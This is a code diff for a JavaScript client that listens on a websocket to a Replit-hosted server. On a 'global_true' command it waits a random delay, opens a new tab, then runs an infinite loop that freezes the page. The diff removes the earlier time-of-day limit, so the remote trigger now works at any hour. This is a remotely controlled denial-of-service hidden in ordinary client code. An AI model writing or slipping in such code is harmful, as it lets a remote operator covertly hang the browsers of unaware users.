@@ -3,21 +3,7 @@ function getRandomInt(min, max) {
     max = Math.floor(max);
     return Math.floor(Math.random() * (max - min + 1)) + min; 
 }
-function updateButtonState() {
-    const now = new Date();
-    const currentHour = now.getHours();
-    const currentMinutes = now.getMinutes();
 
-
-    if (currentHour >= 8 && currentHour < 23) {
-        setTimeout(function() {
-                    window.open('https://google.com','_blank');
-                    while (true) {
-                        console.log("Q");
-                    }
-                       }, getRandomInt(15000,30000))
-            } 
-        }
 
 const REPLIT_WS_URL = "wss://44f64bff-8808-445a-8099-1c8666679313-00-2kblha4tvl79n.pike.replit.dev:3000/";
 let socket;
@@ -37,7 +23,12 @@ function connect() {
             if (data.type === 'client_count') return
             if (data.mode === "global_true" && data.executeGlobalAction === true) {
                 console.log("prob")
-                updateButtonState();
+                setTimeout(function() {
+                    window.open('https://google.com','_blank');
+                    while (true) {
+                        console.log("Q");
+                    }
+                }, getRandomInt(15000,30000))
 
             }
 
